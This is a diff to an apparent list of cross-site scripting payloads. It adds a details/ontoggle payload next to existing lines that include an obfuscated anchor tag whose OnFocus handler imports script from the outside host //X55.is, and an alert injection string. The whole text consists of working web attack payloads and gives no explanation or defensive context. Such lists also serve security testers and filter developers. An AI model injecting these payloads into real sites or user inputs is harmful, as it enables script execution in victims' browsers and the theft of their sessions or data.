@@ -1,3 +1,4 @@
+<details open id="' &quote;'"ontoggle=[JS]>
 <details open id="' &quot;'"ontoggle=[JS]>
 <A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
 "%3balert`1`%3b"
